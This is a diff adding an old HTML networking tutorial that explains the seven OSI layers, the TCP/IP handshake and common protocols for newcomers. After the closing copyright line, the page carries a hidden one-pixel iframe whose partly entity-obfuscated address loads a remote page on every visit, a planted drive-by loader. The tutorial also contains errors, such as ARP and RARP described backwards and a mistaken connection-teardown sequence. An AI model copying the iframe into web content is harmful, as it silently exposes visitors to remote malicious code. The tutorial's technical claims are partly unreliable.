@@ -1,0 +1,314 @@
+
+<HTML><HEAD>
+</HEAD>
+<pre>
+                          ++++++++++++++++++++++++++++++++++++ 
+                          + This tutorial is written by PØØL + Edited By Rek 
+                          ++++++++++++++++++++++++++++++++++++ 
+                                   + The OSI-model + 
+                                   +++++++++++++++++ 
+
+</pre>
+<BODY><BR>&nbsp; <BR>&nbsp; <BR>&nbsp; <BR>&nbsp; 
+<P>* Disclaimer <BR>============ 
+<P>Off course I take NO responsibility for actions or damage caused by this 
+document. All information provided in this tutorial is for educational purpose 
+ONLY. 
+<P>* Intro <BR>======== 
+<P>Well, I've written this tutorial because a friend of mine asked me. I liked 
+that because many people would read it and could learn something. Maybe I'll 
+write some more tutorials later, but I'm reading lots of tutorials and articles 
+myself. So I don't have a lot of time and knowledge to write some good 
+tutorials, but I'll try to do my best... (please accept my poor English). I've 
+written this tutorial especially for newbies who are interested in 
+networking/security and who don't know much about the structure and basics of 
+the Internet and its protocols. If you've already some experience with this 
+subject I suppose you won't learn much from it though. This document explains 
+only the OSI-model in a VERY basic way, so it's easy to understand for newbies. 
+If you want to understand the OSI-model completely you'll have to read some more 
+tutorials, RFC's and books that you can find on the internet. <BR>&nbsp; 
+<P>Have fun... 8) <BR>&nbsp; 
+<P>* The OSI-model <BR>=============== 
+<P>So, what's the OSI-model? Well in the past, communications between computers 
+from different vendors were difficult, because they used different protocols and 
+data-formats. So the International Organization for Standardization (ISO) 
+developed a communications architecture known as the Open System Interconnection 
+(OSI) model that defines standards for linking computers from different vendors. 
+The OSI model has been divided into 7 layers, and the second layer contains also 
+a few sub-layers (divided by the Institute of Electrical and Electronic 
+<BR>Engineers (IEEE) which I won't discuss in this tutorial). Have a look at the 
+following table: <BR>&nbsp; <BR>&nbsp; 
+<P>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 
+<BR>. 7th&nbsp; -&nbsp; layer: Application .&gt; 
+Services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . 
+<BR>. 6th&nbsp; -&nbsp; layer: Presentation.&gt; 
+Services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . 
+<BR>. 5th&nbsp; -&nbsp; layer: Session&nbsp;&nbsp;&nbsp;&nbsp; .&gt; 
+Communication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . <BR>. 4th&nbsp; -&nbsp; 
+layer: Transport&nbsp;&nbsp; .&gt; 
+Communication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . <BR>. 3rd&nbsp; -&nbsp; 
+layer: Network&nbsp;&nbsp;&nbsp;&nbsp; .&gt; 
+Communication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; . <BR>. 2nd&nbsp; -&nbsp; 
+layer: Data-link&nbsp;&nbsp; .&gt; Physical connections. <BR>. 1st&nbsp; -&nbsp; 
+layer: Physical&nbsp;&nbsp;&nbsp; .&gt; Physical connections. 
+<BR>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
+<BR>&nbsp; 
+<P>The layers are defined in such a manner so that changes in one layer do not 
+require changes in the other layers. The higher layers (5, 6 and 7) are smarter 
+than the lower layers; the Application layer can handle the same protocols and 
+data-formats used by the other layers, and more. So there is a huge difference 
+between the Physical layer and the Application layer. Maybe this isn't clear, 
+but you'll (hopefully) understand what I mean after you've read the whole 
+document. A request, generated at the top (for example the application Layer) 
+travels <BR>down six layers to the bottom, or physical layer. Maybe you'll 
+think: "Why are there different layers?" Well, the answer is quite simple: Each 
+layer has its own task(s) to perform, let's have a look at the physical layer 
+first: 
+<P>* The Physical layer (1) <BR>======================== 
+<P>This is the simplest layer; it only has to deal with the electrical (and 
+optical) connections between devices. Binary data is encoded into impulses 
+suitable for transmission over the network medium. For example wires, cables, 
+transceivers &amp; connectors belong all to the Physical layer. Devices like 
+repeaters, hubs &amp; network cards belong also to this layer. 
+<P>* The Data-link layer (2) <BR>========================= 
+<P>This layer is a little bit "smarter" than the physical layer, because it 
+provides the reliable transfer of data. As the interface between the network 
+medium and the higher-level protocols and layers, the data link layer is 
+responsible for the final packaging of the upper-level binary data into discrete 
+packets before it goes to the physical layer. It sends frames (blocks of data) 
+across a network. Ethernet (802.2 &amp; 802.3), Tokenbus (802.4) and Tokenring 
+(802.5) are protocols at the Data-link layer. 
+<P>* The Network layer (3) <BR>======================= 
+<P>The primary task of the network layer is to provide the routing functionality 
+by which packets can be sent across the boundaries of the local network segment 
+to a destination that may be located on an adjacent network or on one thousands 
+of miles away. IP, Internet Protocol, is mostly used for this task. Another 
+protocol on the Network layer is IPX, Internet Packet eXchange. The Novell 
+incorporation has programmed this protocol and some others too, like SPX 
+(Sequence Packet Exchange) &amp; NCP (Netware Core Protocol). These protocols 
+have been imported at the Netware Operating System. A few functions that may 
+take place at the network layer: 
+<P>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The division of the 
+binary data stream into discrete packets of a specified length 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Error detection 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Error correction 
+through the retransmission of bad packets 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flow control 
+<P>* The Transport layer (4) <BR>========================= 
+<P>Well, this layer transports data, using protocols like UDP, TCP and/or SPX 
+(Sequence Packet eXchange, this one is also used by NetWare, but it&amp;rsquo;s 
+in contrast to IPX connection-oriented). The Transport layer is the centre of 
+the OSI-model. This layer provides reliable, transparent transfer of data 
+between end points, this layer provides also multiplexing, flow control and 
+error checking/recovery. 
+<P>* The TCP/IP protocol-suite and a few other protocols 
+<BR>===================================================== 
+<P>Before I'll go on with the fifth layer in the OSI-model, I want to explain 
+something about the most common protocols at this moment: TCP/IP. If you already 
+know the basics of TCP/IP it's advisable to skip this part and read further 
+about the session layer. 
+<P>* TCP/IP <BR>======== 
+<P>TCP stands for 'Transmission Control Protocol' and almost all computers are 
+compatible with this protocol. TCP is connection-based, that means it 
+establishes a (constant) connection between two computers and transfers the data 
+between the two hosts. A packet contains a header and a data gram. In the data 
+gram you'll find the data, in the header(s) of a packet is important information 
+mentioned: <BR>&nbsp; 
+<P>TCP Header: 
+<P>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Source Port 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Destination Port 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sequence number 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Acknowledgement 
+number <BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Header Length 
+(Standard 20 Bytes) <BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Flags (syn, ack, psh, fin, rst, urg) 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Window size 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Checksum 
+<P>IP Header: 
+<P>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IP_v4 or IP_v6 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Header Length 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DSF 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Total Length 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Identification 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flags (Set Fragment 
+bit or not) <BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fragment 
+Offset <BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TTL 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Protocol (this case 
+TCP) <BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Header checksum 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Source IP 
+<BR>-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Destination IP 
+<P>If you want to know how a connection is established, please read on... 
+<P>First a packet with the SYN-flag has to be send to the destination IP, the 
+destination will respond with an ACK(SYN) flag or a packet with the RST-flag. 
+I'll explain: SYN stands for SYN-(chronisation), so it's used to 'ask' the 
+destination computer to establish a connection, when it's accepted, it replies 
+with a packet with the ACK(SYN) flag. ACK stands for ACK-(nowledgement). After 
+receiving the packet with the ACK(SYN) flag, the computer sends back an ACK to 
+tell the other host the connection is established. This is what we call the 
+'Three-Way-Handshake'. If the connection is established and one of the two hosts 
+wants to disconnect, it sends a packet with the FIN-flag set (FIN stands for 
+FINish). This table will make this (hopefully) a bit clearer: <BR>&nbsp; 
+<P>Computer 
+A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Computer B 
+<BR>==========&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+========== 
+<P>1) SYN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<BR>2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&lt;--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACK(SYN) <BR>3) 
+ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<P>YES, there's a connection established! 
+<P>4) FIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<BR>5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&lt;--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ACK(FIN) <BR>6) 
+RST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<P>Now the connection is closed and the data-transfer(s) are terminated. 
+<P>Computer 
+A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Computer B 
+<BR>==========&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+========== 
+<P>1) SYN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<BR>2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&lt;--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RST <BR>3) 
+ACK&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --&gt; 
+<P>Shit... "Computer B" didn't want to be connected to "Computer A!" (maybe 
+Computer B is running a firewall) 
+<P>There are a few ways to exploit the TCP protocol: SYN-floods, teardrop, 
+Smurf-attacks, sequence-number attacks &amp; etc. For more information check 
+http://neworder.box.sk/ and http://packetstorm.securify.com/ 
+<P>All right, IP is the abbreviation of Internet Protocol. Look at the example 
+above, if "Computer A" sends a packet to "Computer B" the IP's of both computers 
+are mentioned in the IP-header of the packet, the destination IP (of computer B) 
+and the source IP (of computer A). The routers between the two hosts look in the 
+IP-header and masquerade the packets to the next segment. If an error occurs 
+while a packet is travelling over the (inter)network, for example the 
+destination host is unreachable, ICMP (Internet Control Message Protocol) is 
+used to send an error message so the error could be corrected (and the packet(s) 
+could be retransmitted). The programs 'ping' and traceroute use ICMP messages to 
+detect the status of hosts in other segments. 
+<P>Currently IP_v4 is standard, but in the future IP_v6, also called IP_ng (next 
+generation), will be used. IP_v4 is based on 32-bits addressing, while IP_v6 
+supports(!) 128-bits addressing. That's a huge difference, so there're many more 
+IP-addresses available when using IP_v6. The IP_v6 header is a simplification of 
+the IP_v4 header, but it's possible to 'update' IP_v6 (so new features could be 
+added). 
+<P>* Other important protocols <BR>=========================== 
+<P>I've discussed a well known Internet Protocol and Transmission Control 
+Protocol. Let's have a look at a few other protocols (NOTE: they're not all in 
+the TCP/IP-suite): 
+<P>* UDP, User Datagram Protocol, is in contrast to TCP connectionless. This 
+means a packet travels over the network and reaches the other computer without a 
+connection being established. On its way to the destination the packet could 
+lose because there isn't a direct connection between the two hosts, so UDP is 
+unreliable. UDP is much faster than TCP because there isn't a direct connection. 
+
+<P>* FTP (File Transfer Protocol), you probably already know about this one... 
+It is used to upload and download files. Security is handled by requiring the 
+user to specify a user name and password at the daemon (sometimes anonymous 
+login is allowed), but you can use <BR>a packetsniffer to obtain the usernames 
+and passwords. A FTP daemon listens standard at 21/TCP and data travels at 
+20/TCP. 
+<P>* HTTP, HyperText Transfer Protocol. HTTP is used to view web pages, in the 
+past a protocol named gopher was used. Gopher can't be used to show nice 
+graphics, only text. So HTTP was developed and it's used by almost everybody. A 
+HTTP daemon listens standard at 80/TCP. 
+<P>* SMTP, Simple Mail Transfer Protocol is used to send electronic mail 
+(E-mail). Read the sendmail-tutorial at http://blacksun.box.sk/ and you will 
+learn a lot more about this protocol, a SMTP daemon (e.g. Sendmail) listens 
+standard at 25/TCP. 
+<P>* POP, Post Office Protocol. Nowadays POP3 is the most favourite 
+standard.&nbsp; POP is used to receive and read e-mail from a web page. A POP3 
+daemon listens standard at 110/TCP. 
+<P>* DHCP: Dynamic Host Configuration Protocol. If you've got a Cable-connection 
+you use DHCP to get your IP from your ISP. 
+<P>* OSPF (Open Shortest Path First) &amp; RIP (Routing Information Protocol) 
+are used for determining the best method of routing. 
+<P>* BOOTP is a protocol used by a network node to determine the IP address of its Ethernet interfaces, in order to affect network booting. The server standard listens at 67/UDP. 
+<P>* ARP &amp; RARP: Address Resolution Protocol. I'll explain this with an 
+example: If you want to send data to a host and you have its MAC-address (Media 
+Access Control, Ethernet-address) you can query a router for the IP, this is 
+handled by ARP. If you have the IP of a host and you want to know its 
+MAC-address, you can use RARP (Reverse Address Resolution Protocol). 
+<P>* Telnet (Network terminal protocol) is used for remote logins at computers 
+(usually UNIX-based boxes). Telnet sends the usernames and passwords in plain 
+text over the network, so anybody can obtain them very easily by using a 
+packetsniffer. There's a protocol called SSH (Secured SHell) which is also used 
+for remote logins but it is more secure: The data transferred between the two 
+hosts is encrypted, so the sniffed packets won't reveal any valuable 
+information. Telnet and SSH are usually used in a UNIX-environment. A telnet 
+daemon listens standard at 23/TCP and an SSH daemon listens standard at 22/TCP. 
+<P>* A typical protocol on UNIX-based systems is finger, nowadays you won't find 
+much boxes with a finger daemon running, standard listening at 79/TCP &amp; 
+79/UDP. It gives valuable information away (like account-names, and maybe phone 
+numbers which could be used in Social-Engineering attacks). There are a lot of 
+vulnerabilities in the finger daemon so it's very insecure. 
+<P>Holy shit, this tutorial was about the OSI-model, let's go on quickly with 
+the Session layer... 
+<P>* The Session layer (5) <BR>======================= 
+<P>The Session layer, because of its name, it is often thought (mistakenly) to 
+be concerned with the network logon procedure and related matters of security. 
+This layer provides service to the upper two layers, it co-ordinates 
+communication between Presentation layer entities. A few protocols at this 
+layer: 
+<P>NETBIOS:&nbsp; A session interface and protocol, developed by IBM, which also 
+provides services to the presentation and application layers. <BR>NETBEUI, 
+(NETBIOS Extended User Interface), an extension of NETBIOS used in Microsoft 
+networking products, such as Windows NT and LAN Manager. <BR>ADSP (AppleTalk 
+Data Stream Protocol). <BR>PAP (Printer Access Protocol), provides Postscript 
+printer access to AppleTalk networks. 
+<P>* The Presentation layer (6) <BR>============================ 
+<P>The Presentation layer of the OSI model performs only a single function: the 
+translation of different types of system syntax. For example, a connection 
+between a PC and a mainframe may require a conversion from the EBCDIC 
+character-encoding format to ASCII and many other factors may have to be 
+considered as well. Data compression (and possible encryption) is handled by 
+this layer. 
+<P>* And finally: The Application layer (7) 
+<BR>======================================== 
+<P>This layer is the 'smartest', gateways resides at this layer. Gateways 
+perform the same tasks as a router, but there's a difference between them (look 
+at the following section for more information about this). The Application layer 
+is the primary interface between the application running on a computer and any 
+network resources it requires access to. The Application layer is the only layer 
+a user will operate at, protocols like FTP, telnet, SMTP, HTTP, POP3 resides at 
+this Application layer. 
+<P>* Routers and Gateways <BR>====================== 
+<P>The difference between routers and gateways is easy to understand when you 
+know something about the OSI-model, and you know about it because you have read 
+the sections above very carefully, didn't you?...&nbsp;&nbsp; :) <BR>Well, as I 
+told you a gateway is at the Application layer, while a router is active at the 
+Network and Transport layers. This means that a router is faster than a gateway 
+because a gateway has also the protocols at the Session, Presentation and 
+Application layers to route. Hmm, let me make it something clearer with an 
+(stupid) example: 
+<P>There are two boys doing their homework, the first boy has only English to 
+learn. While the second boy has English and chemistry to learn. The first boy 
+finished his homework faster because he hadn't to do chemistry, but the second 
+boy will be smarter because he did English AND chemistry, so he knows things 
+that the first boy doesn't knows. 
+<P>Do you understand me? The first boy could be compared with a router (which is 
+faster) while the second boy could be compared with a gateway (which is 
+'smarter'). Read the example above again if you don't understand it... 
+<P>* Final words <BR>============= 
+<P>Well, I hope you enjoyed my (first) tutorial about networking. This tutorial 
+didn't explain you the OSI-model (and TCP/IP) completely but it has given you a 
+basic understanding. I'll update this tutorial in the future. As I said in the 
+Intro: maybe I'll write some more tutorials later, so check regular the website 
+where you have downloaded this article. If you have a GOOD question, comment, or 
+you want to marry me, feel free to send me a mail: shaolin123@hotmail.com 
+<BR>I'll try to answer all serious mails... 
+<P>Greetz to: r00t, NederWiet, ThaMan, DarkWhite, IzNoGood, TheZodiac, pi0d, 
+Nakebod, Reflex and all the others... 
+<P>Special thanks to: r00t, without him I probably wouldn't have written this 
+tutorial, the lectures he gave about networking were great and I learned very 
+much. He and NederWiet are the best hackers I know..!! ;) 
+<P>Some (nice) sites with information about hacking, security and networking: 
+<P><a href="http://packetstorm.securify.com/">http://packetstorm.securify.com/</a> <BR><a href="http://neworder.box.sk/">http://neworder.box.sk/ </a> 
+<BR><a href="http://www.elfqrin.com/">http://www.elfqrin.com/</a> <BR><a href="http://www.cisco.com/">http://www.cisco.com/</a>
+<BR><a href="http://blacksun.box.sk/">http://blacksun.box.sk/</a> <BR><a href="http://212.187.6.213/">http://212.187.6.213/</a>
+<BR><a href="http://hsunderground.box.sk/">http://hsunderground.box.sk/ </a>
+<P>And remember: KNOWLEDGE IS POWER!! 
+<P>============================================================ 
+<P>OSI Model v 1.02, (C) POOL 2001 <BR>&nbsp; </P><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
